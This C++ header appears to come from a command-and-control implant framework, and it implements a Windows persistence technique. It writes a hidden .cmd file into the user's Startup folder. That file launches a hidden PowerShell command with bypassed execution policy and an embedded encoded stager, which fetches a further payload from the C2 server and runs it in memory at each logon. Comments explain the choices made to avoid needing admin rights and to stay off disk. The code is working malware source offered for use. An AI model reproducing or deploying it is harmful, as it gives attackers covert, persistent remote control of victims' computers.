#pragma once
// Windows-only strategy 2: per-user Startup .cmd wrapper.
//
// This header deliberately has NO POSIX branch. The matrix classifies it as
// windows_only, and the POSIX dispatcher never reaches `persist2`.
#ifdef _WIN32

#include "c2_config.h"
#include "network.h"
#include <windows.h>
#include <string>

namespace persistence {

// Strategy 2: Startup-folder .cmd wrapper. It is a text script, NOT a PE,
// and needs no elevation. `schtasks /sc onlogon` was live-rejected with
// "Accesso negato" on a non-admin account, and a shortcut (.lnk) truncates
// Arguments at 1023 chars, too short for the 3.2 KB PIC stager. The .cmd
// carries the same embedded stager strategy 1 uses; the heavy payload is
// still fetched from /x and mapped only in memory.
inline std::string establish_windows_startup(const net::C2Config& cfg,
                                             const std::string& name) {
    (void)cfg;
    if (std::string(C2_PS_STAGER_B64).empty()) {
        return std::string("Error: strategy 2 needs a build with the embedded "
                           "PowerShell stager (do not set "
                           "PHANTOM_BUILD_NO_PS_STAGER).");
    }
    if (name.empty() || name.find_first_of("\\/:*?\"<>|") != std::string::npos) {
        return std::string("Error: invalid persistence name for a Startup file");
    }
    char appdata[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    if (len == 0 || len >= sizeof(appdata)) {
        return std::string("Error: %APPDATA% not available");
    }
    std::string path = std::string(appdata) +
        "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + name + ".cmd";
    std::string body = "@echo off\r\n"
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " +
        std::string(C2_PS_STAGER_B64) + "\r\nexit /b\r\n";
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return std::string("Error: cannot write Startup file ") + path;
    }
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, body.data(), (DWORD)body.size(), &written, NULL);
    CloseHandle(hFile);
    if (!ok || written != body.size()) {
        DeleteFileA(path.c_str());
        return std::string("Error: short write to ") + path;
    }
    return std::string("Persist established (no-disk PE): Startup script ")
        + path + " -> embedded PIC stager (in-memory rebirth at logon)";
}

}  // namespace persistence

#endif  // _WIN32
